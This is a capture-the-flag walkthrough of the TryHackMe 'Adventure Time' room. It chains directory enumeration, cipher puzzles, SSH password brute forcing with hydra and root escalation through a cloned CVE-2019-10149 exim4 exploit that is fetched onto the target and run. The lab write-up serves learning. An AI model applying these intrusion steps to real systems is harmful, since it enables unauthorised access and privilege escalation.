# [Adventure Time](https://tryhackme.com/room/adventuretime)

## A CTF based challenge to get your blood pumping...

# Adventure Time

## Time to go on an adventure. Do you have what it takes to help Finn and Jake find BMO's reset code? Help solve puzzles and try harder to the max.... This is not a real world challenge, but fun and game only (and maybe learn a thing or two along the way).

### Content of flag1 – format is tryhackme{\*\*\*\*\*\*\*\*\*\*\*\*}

1. We begin our adventure by scanning the target machine to identify open ports and services

```Bash
nmap IP
```

![SCREEN01](https://github.com/user-attachments/assets/8bcf90cf-7715-49b4-bf24-c77e0c4e9a51)

2. Since we have a web server running, let's enumerate directories to find hidden content
   - This scan reveals an interesting path: `/candybar`

```Bash
gobuster dir -u https://IP -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

![SCREEN02](https://github.com/user-attachments/assets/8156967a-7c08-4d1b-b018-f7a3fa0312c2)

3. Navigating to `https://IP/candybar` reveals a page with an image
   - Looking at both the image and examining the page source, we discover a encoded string:
   - `KBQWY4DONAQHE53UOJ5CA2LXOQQEQSCBEBZHIZ3JPB2XQ4TQNF2CA5LEM4QHEYLKORUC4===`

![SCREEN03](https://github.com/user-attachments/assets/f8b34be1-3f23-45fa-9a09-fb1d515f1898)

4. We can use [CyberChef](https://gchq.github.io/CyberChef/) to decode it
   - First, we identify it as Base32 encoding
   - After Base32 decoding, we apply ROT13 with 11 rotations
   - The decoded message reveals: **Always check the SSL certificate for clues.**

![SCREEN04](https://github.com/user-attachments/assets/30be1b68-0a5d-443b-9160-2f0c2a7f523f)

5. Following the hint, we inspect the SSL certificate of the website
   - Click on the lock icon in the browser
   - View the certificate details
   - In the certificate information, we find two additional domain names: `land-of-ooo.com` and `adventure-time.com`

![SCREEN05](https://github.com/user-attachments/assets/771fe4ec-48d3-4531-96c5-8589aeef4e1d)

6. To access these domains, we need to add them to the `/etc/hosts` file

![SCREEN06](https://github.com/user-attachments/assets/af1d83f0-42e4-437c-aa18-ce96fe26ff29)

7. Now we can enumerate the newly discovered domain `https://land-of-ooo.com/`
   - This reveals a path: `/yellowdog`

```Bash
gobuster dir -u https://land-of-ooo.com -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

![SCREEN07](https://github.com/user-attachments/assets/7a526a72-547c-45f6-a559-4cee073a2ed7)

8. The `/yellowdog` page doesn't contain useful information, so we continue our enumeration
   - We discover another path: `/bananastock/`

```Bash
gobuster dir -u https://land-of-ooo.com/yellowdog -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

![SCREEN08](https://github.com/user-attachments/assets/c630eb8c-f165-458b-9ecc-df9037e70369)

9. In the `/bananastock/` page, we find morse code in both the image and source code
   - `_/..../.\_.../._/_./._/_./._/...\._/._./.\_/..../.\_..././.../_/_._.__/_._.__/_._.__`

![SCREEN09](https://github.com/user-attachments/assets/aafb65d6-f3d9-41b2-8da1-df34174c56b8)

10. Using [CyberChef](https://gchq.github.io/CyberChef/) to decode the morse code, we get: **THE BANANAS ARE THE BEST!!!**

![SCREEN10](https://github.com/user-attachments/assets/0418d116-fb44-469c-8a0a-e783b63fef5c)

11. Let's continue our directory enumeration
    - This reveals `/princess/`

```Bash
gobuster dir -u https://land-of-ooo.com/yellowdog/bananastock -w /root/Tools/wordlists/dirbuster/directory-list-2.3-medium.txt -k
```

![SCREEN11](https://github.com/user-attachments/assets/7c0234cf-ed98-4715-9f39-cdfeffd3b8f5)

12. In the source code of the princess page, we find an encrypted message with decryption parameters

<pre>
  Secrettext = 0008f1a92d287b48dccb5079eac18ad2a0c59c22fbc7827295842f670cdb3cb645de3de794320af132ab341fe0d667a85368d0df5a3b731122ef97299acc3849cc9d8aac8c3acb647483103b5ee44166
  Key = my cool password
  IV = abcdefghijklmanopqrstuvwxyz
  Mode = CBC
  Input = hex
  Output = raw
</pre>

13. Using [CyberChef](https://gchq.github.io/CyberChef/) with AES decryption, we reveal: **the magic safe is accessibel at port 31337. the magic word is: ricardio**

![SCREEN12](https://github.com/user-attachments/assets/c03ab94d-3497-402b-bbd4-cc69cb1cc949)

14. Set `netcat` on port `31337`, and provide magic word
    - As result we get **The new username is: apple-guards**

```Bash
nc IP 31337
```

![SCREEN13](https://github.com/user-attachments/assets/131d6ab4-ffa5-4e74-ad4f-5888cc6b7632)

15. Now we can SSH into the target as the newly discovered user
    - Once logged in, we can grab our first flag

```Bash
ssh apple-guards@IP
cat flag1
```

![SCREEN14](https://github.com/user-attachments/assets/d0bec939-9663-4b5f-ab33-7b5ca5178daa)

### Content of flag2 – format is tryhackme{\*\*\*\*\*\*\*\*\*\*\*\*}

1. In the `apple-guards` home directory there is also a message from **Marceline**. Let's examine it to find our next lead

```Bash
cat mbox
```

![SCREEN15](https://github.com/user-attachments/assets/8759914d-f94a-4f26-a428-3a666d0bc0d0)

2. The message reveals Marceline has left something for us elsewhere on the system. Let's search for files owned by Marceline
   - We discover a file at `/etc/fonts/helper` owned by Marceline. This is our way forward

```Bash
find / -user marceline -type f 2>/dev/null
/etc/fonts/helper
```

![SCREEN16](https://github.com/user-attachments/assets/bed2511f-53c5-4c2a-b2b0-3304ee6e309f)

3. When we run the helper program, it presents us with an encrypted message using Vigenère cipher
   - The key needed for decryption is **gone**

![SCREEN17](https://github.com/user-attachments/assets/2d396f36-64c1-4a42-9783-0a3300950e1c)

4. Solve the quiz

![SCREEN18](https://github.com/user-attachments/assets/c4d53eba-c6fc-4aa6-ace1-d23b53c31529)

5. Login on Marceline user and get second flag

```Bash
su Marceline
cd /home/marceline
ls -a
cat flag2
```

![SCREEN19](https://github.com/user-attachments/assets/8d64d6f6-ca90-40e7-ace8-80453139347f)

### Content of flag3 – format is tryhackme{\*\*\*\*\*\*\*\*\*\*\*\*}

1. In **Marceline's** home directory we discover a suspicious file called `I-got-a-secret.txt` containing what appears to be binary data

```Bash
cat I-got-a-secret.txt
```

![SCREEN20](https://github.com/user-attachments/assets/9ac6cd03-10fe-407b-b3cd-d6d6f0c026f4)

2. After analyzing the pattern, we realize this isn't standard binary but actually **Spoon binary code**.
   - Using the specialized decoder at [dCode](https://www.dcode.fr/spoon-language), we translate the message
   - Translated message is: **The magic word you are looking for is ApplePie**

![SCREEN21](https://github.com/user-attachments/assets/c9eee715-3d20-4ebb-88f8-f26c92705bfb)

3. Similar to our previous discovery with the "ricardio" magic word, let's connect to port `31337` again and use our newly found magic word
   - The system responds with new credentials for a user named **peppermint-butler**

```Bash
nc IP 31337
```

![SCREEN22](https://github.com/user-attachments/assets/557800bf-1b95-45f0-a148-87e8747026ec)

4. With these new credentials, we can either:
   - SSH directly to the machine as peppermint-butler (ssh peppermint-butler@IP)
   - Or switch user if we're already connected as Marceline (su peppermint-butler)
   - Once logged in as peppermint-butler, we navigate to the home directory and locate flag3

```Bash
cd /home/peppermint-butler/
cat flag3
```

![SCREEN23](https://github.com/user-attachments/assets/c635e5af-e5be-4ecf-a622-affccd6dabc9)

### Content of flag4 – format is tryhackme{\*\*\*\*\*\*\*\*\*\*\*\*}

1. As we continue our adventure with the **peppermint-butler** account, we need to transfer an `butler-1.jpg` image file for further analysis
   - Start a simple HTTP server in the directory containing the image
   - Download the file to our local attacking machine

```Bash
python3 -m http.server
```

![SCREEN24](https://github.com/user-attachments/assets/8313ae64-fdf5-41d3-be31-7a499f782a50)

```Bash
wget http://IP:8000/butler-1.jpg
```

![SCREEN25](https://github.com/user-attachments/assets/0135f124-87d0-4bf1-ae6a-e86fb07aee45)

2. Since the image itself doesn't contain obvious clues, let's search for additional files owned by peppermint-butler that might provide context

```Bash
find / -user peppermint-butler -type f 2>/dev/null
```

3. We discover a file at `/usr/share/xml/steg.txt` that appears to contain a password and hint for steganography with steghide

```Bash
cat /usr/share/xml/steg.txt
```

![SCREEN26](https://github.com/user-attachments/assets/64340798-86e3-499b-903b-3191ae760da4)

```Bash
steghide extract -sf butler-1.jpg
```

![SCREEN27](https://github.com/user-attachments/assets/5f315c6a-14df-416c-92fb-2b6ad8600482)

4. Steghide successfully extracted a password-protected zip archive. We need to find the password to extract its contents. Let's look for additional clues

```Bash
cat /etc/php/zip.txt
```

![SCREEN28](https://github.com/user-attachments/assets/8f6cd8dc-27a8-4468-bcbf-b42268b93253)
![SCREEN29](https://github.com/user-attachments/assets/cb845890-5717-42dc-8de7-4adbc747fddc)

5. We need to create a wordlist with possible password combinations matching the hint

```Bash
crunch 18 18 -t 'The Ice King s@@@@' > file.txt
```

![SCREEN30](https://github.com/user-attachments/assets/5442c997-1a2e-458d-b132-380714a7caae)

6. Now, we can use hydra to brute force SSH access using the wordlist we created and the username "gunter"
   - The password is **The Ice King sucks**

```Bash
hydra -l gunter -P file.txt ssh://IP
```

7. With these credentials, we can now log in as the gunter user and get flag4

```Bash
ssh gunter@IP
ls -a
cat flag4
```

![SCREEN32](https://github.com/user-attachments/assets/49f5a1b6-e4a5-4546-b22a-00fe283a56ef)

### Content of flag5 – format is tryhackme{\*\*\*\*\*\*\*\*\*\*\*\*}

1. Now that we've gained access as the gunter user, our goal is to elevate privileges further to the Princess Bubblegum account. Let's begin by identifying potential privilege escalation vectors by searching for SUID binaries (files that execute with the owner's permissions)
   - The results show several SUID binaries, but `/usr/sbin/exim4` stands out as unusual and potentially exploitable. Exim4 is a mail transfer agent (MTA) that typically doesn't need SUID permissions

```Bash
find / -perm -u=s -type f 2>/dev/null
```

![SCREEN33](https://github.com/user-attachments/assets/354e09ce-8bbf-4cf7-9d96-7bcc1fba3d95)

2. After researching online, we discover that this specific version of exim4 is vulnerable to CVE-2019-10149, a remote command execution vulnerability. Before exploiting, we need to determine which port exim4 is running on by checking its configuration
   - The configuration file reveals the mail server is running on port 60000

```Bash
cat /etc/exim4/update-exim4.conf.conf
```

![SCREEN34](https://github.com/user-attachments/assets/5221fbf1-27ed-4472-bba6-39cd30b013fe)

3. Let's download an existing exploit from GitHub to leverage this vulnerability. We'll clone the repository on our attacking machine and modify the exploit to target the correct port
   - In the wizard.py file, we need to change the default port from 25 to 60000 to match our target's configuration

```Bash
git clone https://github.com/AzizMea/CVE-2019-10149-privilege-escalation exim4
cd exim4
nano wizard.py
```

![SCREEN35](https://github.com/user-attachments/assets/1c7067b3-ea46-44de-9fa3-46bf1130ecef)

4. Now we need to transfer the exploit to the target machine. Let's start a Python HTTP server on our attacking machine to host the exploit file

```Bash
python -m SimpleHTTPServer
```

```Bash
wget http://IP:8000/wizard.py
```

![SCREEN36](https://github.com/user-attachments/assets/2b952dc7-c596-4a5a-85df-f8e464fbd8d1)
![SCREEN37](https://github.com/user-attachments/assets/dff35644-1b6a-4bc7-8cf5-722f2d3f90a2)

5. Move the wizard.py file to the /tmp directory which typically has execution permissions, and then execute the exploit

```Bash
mv wizard.py /tmp
cd /tmp
python3 wizard.py
```

![SCREEN38](https://github.com/user-attachments/assets/75fbb4da-564c-46d0-9901-20a6c699d00c)

6. With root access established, we can now navigate to Princess Bubblegum's directory to find the final flag

```Bash
cd /home/bubblegum/
ls
cd Secrets/
ls
cat bmo.txt
```

![SCREEN39](https://github.com/user-attachments/assets/3c35e86c-67c1-4e68-bd22-0431a7d58f55)
